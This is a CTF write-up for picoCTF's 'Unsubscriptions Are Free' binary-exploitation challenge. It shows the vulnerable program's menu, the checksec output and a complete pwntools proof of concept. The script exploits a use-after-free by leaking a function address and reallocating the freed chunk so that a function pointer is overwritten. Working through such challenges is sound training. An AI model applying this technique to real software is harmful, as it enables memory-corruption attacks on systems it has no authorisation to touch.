# Unsubscriptions Are Free (needs to be updated)
> challenge description: Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. source nc mercury.picoctf.net 50361

given a: binary vuln, source code vuln.c

## running the binary locally

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Unsubscriptions_Are_Free]
└──╼ $./vuln
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
S
OOP! Memory leak...0x80487d6
Thanks for subsribing! I really recommend becoming a premium member!
```

checking binary security settings

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Unsubscriptions_Are_Free]
└──╼ $checksec vuln
[*] '/home/user/ctfs/picoCTF/binary_exploitation/Unsubscriptions_Are_Free/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
### final poc

```python
#!/usr/bin/env python3

from pwn import *
from enum import Enum

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 50361) # nc mercury.picoctf.net 50361

    return r


def main():
    r = conn() 
    r.recv()
    r.sendline(b'S\n')    # subscribe to get the leaked address of haha function
    r.recvuntil("(e)xit\n")
    leaked_line = r.recvlineS()
    leaked = int(leaked_line.replace("OOP! Memory leak...", "").strip(), 16)
    
    log.info("Leaked address: {}".format(hex(leaked)))
    r.sendline(b'I\n')    # free()
    r.sendlineafter(b"You're leaving already(Y/N)?\n", b"Y")
    r.recvline()
    

    payload = p32(leaked) + p32(0)
    log.info(f"Payload created: {payload}")

    r.sendline(b'l\n')    # leave a message -> malloc(8)
    r.sendlineafter(b'try anyways:\n',payload)
 

    log.success(r.recvlineS())


if __name__ == "__main__":
    main()

```
